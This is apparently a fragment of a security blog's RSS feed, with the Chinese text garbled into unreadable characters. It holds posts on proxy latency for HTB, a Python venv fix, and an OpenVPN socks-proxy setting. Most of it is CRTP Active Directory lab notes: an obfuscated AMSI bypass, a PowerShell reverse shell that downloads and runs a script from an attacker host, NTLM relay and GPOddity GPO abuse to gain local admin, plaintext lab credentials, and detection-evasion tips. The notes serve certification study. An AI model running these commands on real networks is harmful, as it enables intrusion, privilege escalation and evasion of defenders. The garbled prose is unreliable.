&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™æ˜¯ç°åœ¨çš„å»¶è¿Ÿï¼Œå¯ä»¥çœ‹åˆ°ç¨³å®šåœ¨400~500ï¼Œæˆ‘ä»¬ ctrl c ç»“æŸæ‰proxychains4çš„è¿›ç¨‹ï¼Œç„¶åå†pingæµ‹è¯•ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;â””â”€$ ping 10.10.11.30
PING 10.10.11.30 (10.10.11.30) 56(84) bytes of data.
64 bytes from 10.10.11.30: icmp_seq=1 ttl=63 time=319 ms
64 bytes from 10.10.11.30: icmp_seq=2 ttl=63 time=254 ms
64 bytes from 10.10.11.30: icmp_seq=3 ttl=63 time=252 ms
64 bytes from 10.10.11.30: icmp_seq=4 ttl=63 time=384 ms
^C
--- 10.10.11.30 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3009ms
rtt min/avg/max/mdev = 251.672/302.076/383.908/54.516 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸ä½¿ç”¨å‰ç½®ä»£ç†åˆ™ç¨³å®šåœ¨200~350ï¼Œä¸¤æ¬¡ç»“æœä¸åŒï¼Œè¯æ˜é…ç½®æˆåŠŸã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ—¶å€™æœ‰å¸ˆå‚…å°±è¦é—®äº†ï¼Œä¸ºä»€ä¹ˆä½ ä½¿ç”¨äº†ä»£ç†åè€Œå˜æ…¢äº†å‘¢ï¼Ÿ&lt;/p&gt;
&lt;h2&gt;å½±å“å› ç´ &lt;/h2&gt;
&lt;p&gt;åŸå› æœ‰å¾ˆå¤šï¼Œæ¯ä¸ªäººçš„ä½¿ç”¨æ•ˆæœéƒ½ä¼šå› ä¸ºä»¥ä¸‹å› ç´ äº§ç”Ÿå½±å“ï¼š&lt;/p&gt;
&lt;h3&gt;1ã€æœºåœºçš„å›½å†…å‡ºå£è·ç¦»ä½ çš„æ‰€åœ¨åœ°å¾ˆè¿œï¼›&lt;/h3&gt;
&lt;p&gt;æœºåœºçš„åŸç†æ˜¯åˆ©ç”¨åœ¨å›½å†…çš„å‡ºå£æœåŠ¡å™¨å°†ä½ çš„æµé‡å‘é€ç»™å›½å¤–èŠ‚ç‚¹ï¼Œä¹Ÿå°±æ˜¯è¯´æ— è®ºå¦‚ä½•ä½ çš„æµé‡è¦å…ˆåˆ°è¾¾å›½å†…çš„å‡ºå£ï¼Œè¿™å°±å¯¼è‡´äº†å¦‚æœä½ è·ç¦»è¯¥å‡ºå£å¾ˆè¿œçš„è¯ï¼Œç”¨äº†ä»£ç†åè€Œé€Ÿåº¦ä¼šå˜æ…¢ï¼Œä¼ è¾“è·ç¦»è¶Šè¿œï¼ŒæŸè€—å°±è¶Šå¤§ï¼Œç”šè‡³æ²¡æœ‰ç›´æ¥è¿æ¥æ¥å¾—å¿«ï¼Œåƒå’±å°±æ˜¯ç›´æ¥è£¸è¿è¦æ¯”æŒ‚ä»£ç†è¦æµç•…çš„å¤šã€‚&lt;/p&gt;
&lt;p&gt;ä¸¾ä¸ªä¾‹å­ï¼šå‡è®¾ä½ åœ¨åŒ—äº¬ï¼Œæƒ³é€šè¿‡ä»£ç†è®¿é—®æ—¥æœ¬èŠ‚ç‚¹ï¼Œè€Œä½ çš„æœºåœºå›½å†…å‡ºå£åœ¨å¹¿å·ï¼Œä½ çš„æµé‡å°±ä¼šå…ˆå‘ç»™å¹¿å·çš„å‡ºå£æœåŠ¡å™¨ï¼Œå†å‘é€åˆ°æ—¥æœ¬ï¼›&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ä»£ç†æ—¶ï¼š&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&quot;https://img.picgo.net/2024/08/30/30fb86f028c8b892d.png&quot; alt=&quot;3&quot; border=&quot;0&quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;ä¸ä½¿ç”¨ä»£ç†æ—¶ï¼š&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&quot;https://img.picgo.net/2024/08/30/49f3f50c7bb7535cb.png&quot; alt=&quot;4&quot; border=&quot;0&quot;&amp;gt;&lt;/p&gt;
&lt;h3&gt;2ã€ç»è¿‡çš„è·¯ç”±æ¡æ•°&lt;/h3&gt;
&lt;p&gt;å¦‚æœä½ æ‰€åœ¨çš„åŸå¸‚æ°å¥½æœ‰ç›´è¾¾æŸæŸå›½å®¶çš„æµ·åº•å…‰çº¤ä»€ä¹ˆçš„ï¼Œå°±ç›¸å½“äºæ˜¯åç›´è¾¾çš„é£æœºäº†ï¼Œè·Ÿä½ åé«˜é“å»åˆ°å¹¿å·ï¼Œå†é£æœºå»æ—¥æœ¬ï¼Œå†é£å»é˜¿ç¾è‰å¡ç›¸æ¯”ï¼Œè‚¯å®šæ˜¯ç›´è¾¾çš„æ›´å¿«å•¦ï¼Œå®ƒçœå»äº†ä½ åœ¨æ¯ä¸ªæœºåœºã€æ¯ä¸ªå›½å®¶ä¸­è½¬æ‰€æ¶ˆè€—çš„æ—¶é—´ã€‚&lt;/p&gt;
&lt;p&gt;ä»£å…¥ä½ çš„æµé‡æ‰€éœ€è¦ç»è¿‡çš„è·¯ç”±èŠ‚ç‚¹ï¼Œå°±æ˜¯ç±»ä¼¼çš„åŸç†äº†ï¼Œæµé‡æ¯ç»è¿‡ä»»ä½•ä¸€ä¸ªè®¾å¤‡ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºäº¤æ¢æœºã€è·¯ç”±å™¨ï¼Œéƒ½ä¼šäº§ç”ŸæŸè€—ï¼Œä¹Ÿå°±æ˜¯çœå»äº†è¿è¥å•†ä¹‹é—´ã€å„ä¸ªå›½å®¶ä¹‹é—´çš„ä¸­è½¬è€—æ—¶ã€‚&lt;/p&gt;
&lt;h3&gt;3ã€å„è¿è¥å•†çš„é™åˆ¶/ç­–ç•¥/çº¿è·¯ä¸åŒ&lt;/h3&gt;
&lt;p&gt;åœ°åŒºä¸åŒï¼Œæ‰€ç”¨ç½‘ç»œçš„è¿è¥å•†ä¸åŒï¼Œå¯¹æˆ‘ä»¬ä½¿ç”¨ä»£ç†éƒ½ä¼šäº§ç”Ÿä¸åŒçš„å½±å“ï¼Œè¿™æ˜¯æˆ‘ä»¬å¾ˆéš¾å»æ§åˆ¶çš„å› ç´ äº†ï¼Œä½†å¾€å¾€è¿™æ˜¯æœ€å¸¸è§çš„åŸå› ã€‚&lt;/p&gt;
&lt;p&gt;å¾ˆå¤šå¸ˆå‚…åº”è¯¥ä¹Ÿæ·±æœ‰ä½“ä¼šï¼Œç”¨æŸæŸè¿è¥å•†å°±å¯ä»¥æµç•…è®¿é—®xxxxxxï¼Œè€ŒæŸæŸè¿è¥å•†å°±ç‰¹åˆ«å¡ã€‚&lt;/p&gt;
&lt;h3&gt;4ã€æœºåœºä¸å¥½&lt;/h3&gt;
&lt;p&gt;æƒ³æƒ³çœ‹ä½ åœ¨è·Ÿå¤šå°‘äººå…±ç”¨ä¸€ä¸ªèŠ‚ç‚¹è«ï¼Œä»·æ ¼ä½å»¶è¿Ÿä½é€Ÿåº¦å¿«æµé‡å¤šçš„æœºåœºå¯ä¸å¸¸è§å“¦ã€‚&lt;/p&gt;
&lt;h3&gt;5ã€æœåŠ¡ç«¯çš„æ•…éšœ/é™æµ/æ‹¥å µ&lt;/h3&gt;
&lt;p&gt;æœ‰æ²¡æœ‰å¯èƒ½ï¼Œå’±ä»¬æ¢ä¸ªHTBçš„èŠ‚ç‚¹å°±å¥½äº†è«ï¼Œæ¯•ç«ŸHTBèŠ‚ç‚¹æ•…éšœä¹Ÿä¸æ˜¯ä¸€æ¬¡ä¸¤æ¬¡äº†è«ã€‚ã€‚ã€‚é‡åˆ°æ‰“é¶ç‰¹åˆ«å¡çš„æƒ…å†µï¼Œå¸ˆå‚…ä»¬ä¸å¦¨å°è¯•æ›´æ¢ä¸€ä¸‹å¤§åŒºï¼Ÿ&lt;/p&gt;
&lt;p&gt;å…¶ä»–çš„å’±ä»¬å°±ä¸å¤šèµ˜è¿°äº†ï¼Œç¥ä½ æ‹¥æœ‰æ„‰å¿«çš„æ‰“é¶ä½“éªŒ ; )&lt;/p&gt;
</content:encoded></item><item><title>é€šè¿‡brewå®‰è£…çš„pythonæ— æ³•ä½¿ç”¨pipå®‰è£…ç¬¬ä¸‰æ–¹åº“</title><link>https://25pm-sumio.github.io/posts/2024/09/12/01/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/2024/09/12/01/</guid><description>ä½¿ç”¨venvåˆ›å»ºè™šæ‹Ÿpythonç¯å¢ƒ</description><pubDate>Thu, 12 Sep 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;åœ¨ä½¿ç”¨brewå®‰è£…pythonåï¼Œç›´æ¥ä½¿ç”¨pipå®‰è£…ç¬¬ä¸‰æ–¹æ’ä»¶ä¼šé‡åˆ°å¦‚ä¸‹æŠ¥é”™ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;âœ  25pm-sumio.github.io git:(main) pip3 install setuptools
error: externally-managed-environment

Ã— This environment is externally managed
â•°â”€&amp;gt; To install Python packages system-wide, try brew install
    xyz, where xyz is the package you are trying to
    install.

    If you wish to install a Python library that isn&apos;t in Homebrew,
    use a virtual environment:

    python3 -m venv path/to/venv
    source path/to/venv/bin/activate
    python3 -m pip install xyz

    If you wish to install a Python application that isn&apos;t in Homebrew,
    it may be easiest to use &apos;pipx install xyz&apos;, which will manage a
    virtual environment for you. You can install pipx with

    brew install pipx

    You may restore the old behavior of pip by passing
    the &apos;--break-system-packages&apos; flag to pip, or by adding
    &apos;break-system-packages = true&apos; to your pip.conf file. The latter
    will permanently disable this error.

    If you disable this error, we STRONGLY recommend that you additionally
    pass the &apos;--user&apos; flag to pip, or set &apos;user = true&apos; in your pip.conf
    file. Failure to do this can result in a broken Homebrew installation.

    Read more about this behavior here: &amp;lt;https://peps.python.org/pep-0668/&amp;gt;

note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.
hint: See PEP 668 for the detailed specification.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œä½¿ç”¨ç¯å¢ƒç®¡ç†å™¨åˆ›å»ºç”¨äºé¡¹ç›®éš”ç¦»çš„è™šæ‹Ÿç¯å¢ƒä»¥è§£å†³è¯¥é—®é¢˜ï¼›&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#æ‰¾ä¸€ä¸ªå–œæ¬¢çš„åœ°æ–¹åˆ›å»ºè™šæ‹Ÿç¯å¢ƒç›®å½•ï¼Œå¹¶è¿›å…¥è¯¥ç¯å¢ƒ
âœ  python@3.12 git:(stable) python3 -m venv ./env
âœ  python@3.12 git:(stable) source ./env/bin/activate
(env) âœ  python@3.12 git:(stable)
#è‹¥è¦ä½¿ç”¨brewå®‰è£…çš„pythonåº“ï¼ˆä¾‹å¦‚pwntoolsï¼‰ï¼Œè¯·å‚è€ƒhttps://25pm-sumio.github.io/posts/2024/08/18/01/#5%E4%B8%BApython%E6%B7%BB%E5%8A%A0%E6%89%98%E5%B1%95%E7%9B%AE%E5%BD%95pth
#åœ¨è™šæ‹Ÿç¯å¢ƒçš„./lib/python3.12/site-packages/mypath.pthä¸­æ·»åŠ pwntoolsçš„ç»å¯¹è·¯å¾„å³å¯
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Pycharmä½¿ç”¨è¯¥è™šæ‹Ÿç¯å¢ƒç¼–å†™è„šæœ¬çš„é…ç½®&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&quot;https://img.picgo.net/2024/09/12/0101d981a1e632ffd95d.png&quot; alt=&quot;0101&quot; border=&quot;0&quot;&amp;gt;&lt;/p&gt;
</content:encoded></item><item><title>ä¿®æ”¹OVPNé…ç½®æ–‡ä»¶å®ç°å‰ç½®ä»£ç†è®¿é—®HTB</title><link>https://25pm-sumio.github.io/posts/2025/06/02/01/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/2025/06/02/01/</guid><description>å¦‚æœå«Œproxychainså‰ç½®ä»£ç†è¿‡äºå¤æ‚ï¼Œå¯ä»¥å°è¯•æ­¤æ–¹æ³•ã€‚</description><pubDate>Mon, 02 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;ä¿®æ”¹é…ç½®æ–‡ä»¶&lt;/h2&gt;
&lt;p&gt;åœ¨openvpnçš„é…ç½®æ–‡ä»¶ä¸­æ·»åŠ socks-proxyé€‰é¡¹å³å¯ï¼Œæ ¼å¼ä¸º&lt;strong&gt;socks-proxy&amp;lt;ç©ºæ ¼&amp;gt;[å±€åŸŸç½‘ä»£ç†IP]&amp;lt;ç©ºæ ¼&amp;gt;[socksä»£ç†ç«¯å£]&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dev tun
persist-tun
persist-key
[snip]
socks-proxy 10.211.55.2 7890

&amp;lt;ca&amp;gt;
-----BEGIN CERTIFICATE-----
MIIEDTCCAvWgAwIBAgIIYXd3IzPHH8IwDQYJKoZIhvcNAQELBQAwXTETMBEGA1UE
[snip]
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>CRTP-Lab ç¬”è®°</title><link>https://25pm-sumio.github.io/posts/2025/06/12/01/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/2025/06/12/01/</guid><description>CRTPè€ƒè¯•ç¬”è®°ï¼Œè‡ªç”¨</description><pubDate>Thu, 12 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;CRTP-Lab&lt;/h1&gt;
&lt;h4&gt;Bypass Powershell Security&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;# æ— ç®¡ç†å‘˜æƒé™
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# æœ‰ç®¡ç†å‘˜æƒé™
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ç»•è¿‡AMSI&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;S`eT-It`em ( &apos;V&apos;+&apos;aR&apos; +  &apos;IA&apos; + ((&quot;{1}{0}&quot;-f&apos;1&apos;,&apos;blE:&apos;)+&apos;q2&apos;)  + (&apos;uZ&apos;+&apos;x&apos;)  ) ( [TYpE](  &quot;{1}{0}&quot;-F&apos;F&apos;,&apos;rE&apos;  ) )  ;    (    Get-varI`A`BLE  ( (&apos;1Q&apos;+&apos;2U&apos;)  +&apos;zX&apos;  )  -VaL  ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((  &quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f(&apos;Uti&apos;+&apos;l&apos;),&apos;A&apos;,(&apos;Am&apos;+&apos;si&apos;),((&quot;{0}{1}&quot; -f &apos;.M&apos;,&apos;an&apos;)+&apos;age&apos;+&apos;men&apos;+&apos;t.&apos;),(&apos;u&apos;+&apos;to&apos;+(&quot;{0}{2}{1}&quot; -f &apos;ma&apos;,&apos;.&apos;,&apos;tion&apos;)),&apos;s&apos;,((&quot;{1}{0}&quot;-f &apos;t&apos;,&apos;Sys&apos;)+&apos;em&apos;)  ) ).&quot;g`etf`iElD&quot;(  ( &quot;{0}{2}{1}&quot; -f(&apos;a&apos;+&apos;msi&apos;),&apos;d&apos;,(&apos;I&apos;+(&quot;{0}{1}&quot; -f &apos;ni&apos;,&apos;tF&apos;)+(&quot;{1}{0}&quot;-f &apos;ile&apos;,&apos;a&apos;))  ),(  &quot;{2}{4}{0}{1}{3}&quot; -f (&apos;S&apos;+&apos;tat&apos;),&apos;i&apos;,(&apos;Non&apos;+(&quot;{1}{0}&quot; -f&apos;ubl&apos;,&apos;P&apos;)+&apos;i&apos;),&apos;c&apos;,&apos;c,&apos;  )).&quot;sE`T`VaLUE&quot;(  ${n`ULl},${t`RuE} )
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ä½¿ç”¨PowerView&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;. C:\AD\Tools\PowerView.ps1 
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;æšä¸¾ã€æ”¶é›†ä¿¡æ¯&lt;/h2&gt;
&lt;h4&gt;è·å–åŸŸå†…ç”¨æˆ·&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainUser
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½¿ç”¨ADModule&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
Get-ADUser -Filter *
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;åˆ—å‡ºæ‰€æœ‰ç”¨æˆ·çš„ç‰¹å®šå±æ€§&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainUser | select -ExpandProperty samaccountname
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;Get-ADUser -Filter * -Properties *| select Samaccountname,Description
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;æšä¸¾åŸŸä¸­çš„æˆå‘˜è®¡ç®—æœº&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainComputer | select -ExpandProperty dnshostname
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;Get-ADComputer -Filter *
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;åˆ—å‡ºæŸä¸ªåŸŸä¸­æ‰€æœ‰çš„ AD ç»„å¯¹è±¡&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;## çˆ¶åŸŸ
Get-DomainGroup -Domain moneycorp.local
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;æŸ¥çœ‹åŸŸç®¡ç†å‘˜ç»„çš„è¯¦ç»†ä¿¡æ¯&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainGroup -Identity &quot;Domain Admins&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;æšä¸¾åŸŸç®¡ç†å‘˜ç»„çš„æˆå‘˜&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainGroupMember -Identity &quot;Domain Admins&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;Get-ADGroupMember -Identity &apos;Domain Admins&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;æšä¸¾ä¼ä¸šç®¡ç†å‘˜ç»„çš„æˆå‘˜&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainGroupMember -Identity &quot;Enterprise Admins&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;Get-ADGroupMember -Identity &apos;Enterprise Admins&apos; -Server moneycorp.local
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;æšä¸¾åŸŸç®¡ç†å‘˜ç»„çš„ ACL&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainObjectAcl -Identity &quot;Domain Admins&quot; -ResolveGUIDs -Verbose
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;åˆ—å‡ºæ‰€æœ‰ OU&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainOU

#åªåˆ—åå­—
Get-DomainOU | select -ExpandProperty name

#åˆ—å‡º StudentMachines OU ä¸­çš„æ‰€æœ‰è®¡ç®—æœº
(Get-DomainOU -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;åˆ—å‡ºGPO&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainGPO
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;æšä¸¾åœ¨ StudentMachines OU ä¸Šåº”ç”¨çš„ GPO&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;(Get-DomainOU -Identity StudentMachines).gplink								# OU çš„ gplink å±æ€§çš„ç­–ç•¥åç§°
[LDAP://cn={7478F170-6A0C-490C-B355-9E4618BC785D},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]

Get-DomainGPO -Identity &apos;{0BF8D01C-1F62-4BDC-958C-57140B67D147}&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;æšä¸¾æ—ä¸­æ‰€æœ‰åŸŸ&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;Get-ForestDomain -Verbose
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;(Get-ADForest).Domains
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;åˆ—å‡ºæ‰€æœ‰ä¿¡ä»»&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainTrust
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;Get-ADTrust -Filter *
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ä»…åˆ—å‡ºmoneycorp.localæ£®æ—ä¸­çš„å¤–éƒ¨ä¿¡ä»»&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq &quot;FILTER_SIDS&quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;Get-ADForest | %{Get-ADTrust -Filter *}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;åˆ—å‡ºmoneycorp.localåŸŸçš„å¤–éƒ¨ä¿¡ä»»&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainTrust | ?{$_.TrustAttributes -eq &quot;FILTER_SIDS&quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;(Get-ADForest).Domains | %{Get-ADTrust -Filter &apos;(intraForest -ne $True) -and (ForestTransitive -ne $True)&apos; -Server $_}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;æšä¸¾ eurocorp.local æ—çš„ä¿¡ä»»&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;Get-ADTrust -Filter &apos;(intraForest -ne $True) -and(ForestTransitive -ne $True)&apos;

Get-ADTrust -Filter * -Server eurocorp.local
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;æ‰¾åˆ°ä½¿ç”¨ç”¨æˆ·è´¦æˆ·è¿è¡Œçš„æœåŠ¡&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainUser -SPN
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;æ‰¾å‡ºå¯ç”¨æ— çº¦æŸå§”æ´¾çš„æœºå™¨&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainComputer -Unconstrained | select -ExpandProperty samaccountname
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;ææƒ&lt;/h2&gt;
&lt;h4&gt;ä½¿ç”¨PowerSploitæ¨¡å—çš„Powerupæ¥æ£€æŸ¥ä»»ä½•æƒé™å‡çº§è·¯å¾„&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ä½¿ç”¨Invoke-ServiceAbuseæ»¥ç”¨ææƒ&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;#å°†æœ¬ç”¨æˆ·æ·»åŠ åˆ°Administratorsç»„
Invoke-ServiceAbuse -Name &apos;AbyssWebServer&apos; -UserName &apos;dcorp\student226&apos; -Verbose
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ä½¿ç”¨winpeasæ£€æŸ¥ææƒè·¯å¾„&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;PrivEscCheckææƒ&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;. C:\AD\Tools\PrivEscCheck.ps1
Invoke-PrivescCheck
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;æŸ¥æ‰¾å…·æœ‰æœ¬åœ°ç®¡ç†å‘˜è®¿é—®æƒé™çš„åŸŸä¸­æœºå™¨&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ä½¿ç”¨winrsä½œä¸ºstudentè¿æ¥åˆ°dcorp-adminsrv&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;winrs -r:dcorp-adminsrv cmd

set username
set computername
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;å¼¹shell&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;python3 -m http.server 8080

C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443

powershell.exe iex (iwr http://172.16.100.26:8080/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.26 -Port 443
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;GPOæ»¥ç”¨-GPOddity&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.26 --http-port &apos;80,8080&apos; -i --no-smb-server

#åˆ›å»ºä¸€ä¸ªè¿æ¥ntlmrelayxçš„å¿«æ·æ–¹å¼
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command &quot;Invoke-WebRequest -Uri &apos;http://172.16.100.26&apos; -UseDefaultCredentials&quot;

#ç„¶åcopyåˆ°AIä¸‹ï¼Œbotä¼šæ¯åˆ†é’Ÿç‚¹å‡»
xcopy C:\AD\Tools\studentx.lnk \\dcorp-ci\AI

#è¿æ¥11000ä¸Šçš„ldap shell
nc 127.0.0.1 11000

#å°†studentå†™å…¥devopsçš„GPO
write_gpo_dacl student226 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ–è€…æ–°å»ºä¸€ä¸ªç”¨æˆ·ï¼Œå†å†™æƒé™&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# add_computer stdx-gpattack Secretpass@123

# write_gpo_dacl stdx-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ctrl+cåœæ‰ä¸¤ä¸ªè¿›ç¨‹ï¼Œç„¶åä½¿ç”¨GPOddity&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cd /mnt/c/AD/Tools/GPOddity

sudo python3 gpoddity.py --gpo-id &apos;0BF8D01C-1F62-4BDC-958C-57140B67D147&apos; --domain &apos;dollarcorp.moneycorp.local&apos; --username &apos;student226&apos; --password &apos;aTXJBtHUgN3D95ub&apos; --command &apos;net localgroup administrators student226 /add&apos; --rogue-smbserver-ip &apos;172.16.100.26&apos; --rogue
-smbserver-share &apos;std226-gp&apos; --dc-ip &apos;172.16.2.1&apos; --smb-mode none
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ–°å»ºå¹¶å…±äº« std226-gp&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mkdir /mnt/c/AD/Tools/std226-gp

cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std226-gp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œcmdï¼Œè¿è¡Œå‘½ä»¤ä»¥å…è®¸Everyoneå¯¹std226-gpè·å–å®Œå…¨æƒé™&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;net share std226-gp=C:\AD\Tools\std226-gp /grant:Everyone,Full

icacls &quot;C:\AD\Tools\std226-gp&quot; /grant Everyone:F /T
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç°åœ¨çœ‹çœ‹gpcfilesyspathæ˜¯ä¸æ˜¯å·²ç»æ”¹å˜&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Get-DomainGPO -Identity &apos;DevOps Policy&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç­‰å¾…ç»„ç­–ç•¥ç”Ÿæ•ˆï¼Œå°†student226æ·»åŠ åˆ°dcorp-ciçš„æœ¬åœ°ç®¡ç†å‘˜ç»„ä¸­&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;winrs -r:dcorp-ci cmd
winrs -r:dcorp-ci cmd /c &quot;set computername &amp;amp;&amp;amp; set username&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ä½¿ç”¨Invoke-SessionHunteræšä¸¾è¿œç¨‹æœºå™¨ä¸Šçš„æ‰€æœ‰ä¼šè¯&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

. C:\AD\Tools\Invoke-SessionHunter.ps1

Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access

##é¿å…MDIæ£€æµ‹
Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access
